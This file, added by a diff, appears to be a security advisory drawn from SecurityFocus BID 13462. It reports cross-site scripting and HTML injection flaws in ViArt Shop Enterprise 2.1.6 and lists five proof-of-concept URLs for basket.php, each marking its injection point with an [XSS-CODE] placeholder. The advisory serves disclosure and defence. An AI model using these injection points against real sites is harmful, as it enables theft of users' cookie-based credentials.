@@ -1,0 +1,13 @@
+source: http://www.securityfocus.com/bid/13462/info
+
+ViArt Shop is affected by multiple cross-site scripting and HTML injection vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input before using it in dynamically generated content.
+
+Attacker-supplied HTML and script code would be able to access properties of the site, potentially allowing for theft of cookie-based authentication credentials. An attacker could also exploit this issue to control how the site is rendered to the user; other attacks are also possible.
+
+These issues are reported to affect ViArt Shop Enterprise version 2.1.6; other versions may also be vulnerable. 
+
+http://www.example.com/basket.php?rp=products.php%3Fcategory_id%3D0[XSS-CODE]%26search_string%3Dss%26search_category_id%3D
+http://www.example.com/basket.php?rp=products.php%3Fcategory_id%3D0%26search_string%3D[XSS-CODE]%26search_string%3Dss%26search_category_id%3D%26search_category_id%3D
+http://www.example.com/basket.php?rp=products.php%3Fcategory_id%3D0%26search_string%3Dss%26search_string%3Dss%26search_category_id[XSS-CODE]%26search_category_id%3D
+http://www.example.com/basket.php?rp=products.php%3Fcategory_id%3D0%26search_string%3Dss%26search_string%3Dss%26search_category_id%3D[XSS-CODE]%26search_category_id%3D
+http://www.example.com/basket.php?rp=products.php%3Fcategory_id%3D0%26search_string%3Dss%26search_string%3Dss%26search_category_id%3D%26search_category_id%3D[XSS-CODE]
